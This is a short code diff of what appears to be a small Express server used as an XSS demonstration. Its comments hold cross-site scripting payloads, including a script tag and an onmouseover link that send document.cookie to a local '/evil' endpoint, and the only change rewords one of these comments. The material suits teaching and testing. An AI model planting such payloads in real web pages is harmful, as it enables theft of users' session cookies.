@@ -40,4 +40,4 @@ app.listen(5000, '0.0.0.0', () => {
 
 // text <script>alert('hacked')</script>
 // text <script>document.write('<img src="http://localhost:5000/evil?cookie='+escape(document.cookie)+'"/>')</script>
-// Check out this <a href="http://www.youtube.com" onmouseover="window.location='http://localhost:5000/evil?cookie='+escape(document.cookie)">http://www.youtube.com</a>
+// Check this out <a href="http://www.youtube.com" onmouseover="window.location='http://localhost:5000/evil?cookie='+escape(document.cookie)">http://www.youtube.com</a>
